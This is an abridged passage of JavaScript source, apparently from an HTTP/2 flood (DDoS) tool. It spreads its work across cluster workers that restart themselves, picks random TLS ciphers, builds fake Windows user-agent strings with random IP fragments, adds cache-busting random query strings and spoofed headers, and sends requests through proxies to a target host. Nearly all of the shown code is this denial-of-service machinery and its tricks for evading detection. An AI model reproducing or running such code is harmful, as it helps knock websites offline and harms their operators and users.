...
let cipher = cipherList[Math.floor(Math.floor(Math.random() * cipherList.length))];
...
let signalsList = signatureAlgorithms.join(':');
...
if (cluster.isMaster) {
    ...
    const restartScript = () => {
        ...
        console.log(`[>] Restarting the script in ${restartDelay} ms...`.brightCyan);
        setTimeout(() => {
...
const winArchitectures = [
    "x86-16", "x86-16, IA32", "IA-32", "IA-32, Alpha, MIPS",
    "IA-32, Alpha, MIPS, PowerPC", "Itanium", "x86_64", "IA-32, x86-64",
    "IA-32, x86-64, ARM64", "x86-64, ARM64", "ARMv4, MIPS, SH-3", "ARMv4",
    "ARMv5", "ARMv7", "IA-32, x86-64, Itanium", "IA-32, x86-64, Itanium",
    "x86-64, Itanium",
];

const winChannels = [
    "2012 R2", "2019 R2", "2012 R2 Datacenter", "Server Blue",
    "Longhorn Server", "Whistler Server", "Shell Release", "Daytona",
    "Razzle", "HPC 2008",
];
...
function generateRandomAlphaNumericString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
...
function runFlooder() {
    ...
    const sendRequest = (proxyAddr) => {
        ...
        const winArchitecture = randomElement(winArchitectures);
        const winChannel = randomElement(winChannels);
        const randomDigits = randomStringNumber(6);
        const randomIpPart = `${getRandomInt(100, 200)}.${getRandomInt(0, 255)}.${getRandomInt(0, 255)}.${getRandomInt(0, 255)}`;

        const dynamicHeaders = {
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + randomString(3) + "=" + generateRandomAlphaNumericString(10, 25),
            ":method": "GET",
            "pragma": "no-cache",
            ...
            "user-agent": `/5.0 (${osName}; ${winChannel}; ${winArchitecture} ; ${randomDigits} ${randomIpPart}) /Gecko/20100101 Edg/91.0.864.59 ${randomIpPart}`,
            "accept": randomElement(acceptHeaders),
            "accept-language": randomElement(languageHeaders),
            "origin": "https://" + parsedTarget.host,
            "source-ip": randomString(5),
        ...
        socket.http(proxyOptions, (connection, error) => {
            ...
            const tlsConnection = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
